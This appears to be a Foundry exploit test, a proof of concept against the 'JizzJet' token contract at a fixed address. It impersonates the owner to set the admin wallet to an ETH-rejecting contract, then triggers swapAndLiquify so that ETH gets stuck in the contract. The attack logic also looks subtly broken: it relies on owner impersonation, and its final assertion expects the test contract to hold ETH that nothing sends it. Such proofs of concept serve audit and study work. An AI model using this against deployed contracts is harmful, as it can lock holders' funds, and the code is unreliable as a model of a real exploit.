pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IJizzJet {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function _adminWalletAddress() external view returns (address payable);
    function _setReceiverWallet(address payable adminWalletAddress) external;
    function swapAndLiquifyEnabled() external view returns (bool);
    function owner() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2;
    address attacker = address(this);
    IJizzJet target;
    RejectingContract rejectingContract;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = IJizzJet(TARGET);
        rejectingContract = new RejectingContract();
        vm.label(TARGET, "JizzJet Contract");
        vm.label(address(rejectingContract), "Rejecting Contract");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Change admin to rejecting contract
        address owner = target.owner();
        vm.startPrank(owner);
        target._setReceiverWallet(payable(address(rejectingContract)));
        vm.stopPrank();

        // Step 2: Get tokens from owner (threshold = 100000000 * 10**1 * 10**9 = 1e18)
        uint256 threshold = 100000000 * 10**1 * 10**9;
        vm.startPrank(owner);
        target.transfer(attacker, threshold * 2);
        vm.stopPrank();

        // Step 3: Transfer tokens TO the target contract to trigger swapAndLiquify
        // This triggers swapAndLiquify because: contract balance >= threshold, from != uniswapV2Pair, swapAndLiquifyEnabled = true
        target.transfer(TARGET, threshold);

        // Step 4: Check if ETH is stuck in contract (swap succeeded but admin transfer failed)
        assertGt(address(TARGET).balance, 0, "ETH should be stuck in contract");
        assertGt(address(this).balance, 0, "Logic Exploit Failed");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

contract RejectingContract {
    receive() external payable {
        revert("No ETH for you!");
    }
    fallback() external payable {
        revert("No ETH for you!");
    }
}

